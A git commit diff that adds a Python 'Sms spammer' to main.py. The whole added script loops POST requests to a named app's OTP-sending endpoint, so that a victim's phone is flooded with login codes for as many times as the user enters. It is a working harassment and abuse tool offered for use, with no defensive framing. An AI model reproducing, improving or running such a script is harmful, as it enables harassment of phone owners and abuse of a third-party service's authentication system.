f6473d4a17ca2e3dc193842fc9893fe8f590e69d
faresMshams <faresghalwash2022@gmail.com>
2024-08-25 04:24:16 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,2 +1,23 @@
-print('Script closed ')
-input("Press enter key to close ...")
+import requests
+
+def send_otp_requests(phone, num_requests):
+    url = "https://fatura-app.com/auth/otp/send"
+    payload = {
+        "type": "login",
+        "phone": phone,
+        "otp": None
+    }
+    
+    for i in range(1, num_requests + 1):
+        response = requests.post(url, json=payload)
+        if response.status_code == 200:
+            print(f"Done Sent {i} messages")
+        else:
+            print(f"Failed to send message {i}")
+
+if __name__ == "__main__":
+   print('Sms spammer By Ghalwash @Mrfa0gh')
+    print('')
+    phone = input("Enter phone number: ")
+    num_requests = int(input("Enter number of requests: "))
+    send_otp_requests(phone, num_requests)
